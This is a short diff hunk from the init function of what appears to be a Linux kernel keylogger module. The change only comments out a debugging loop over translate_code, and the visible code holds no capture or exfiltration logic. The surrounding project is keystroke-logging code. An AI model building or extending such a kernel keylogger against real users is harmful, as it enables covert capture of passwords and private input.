@@ -63,10 +63,10 @@ static int __init key_logger_init(void)
     shift = FALSE;
 
     // DEBUGGING
-    for (i = 0; i <= 85; i++)
-    {
-        translate_code(i);
-    }
+    // for (i = 0; i <= 85; i++)
+    // {
+    //     translate_code(i);
+    // }
     
     // DONE
     HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
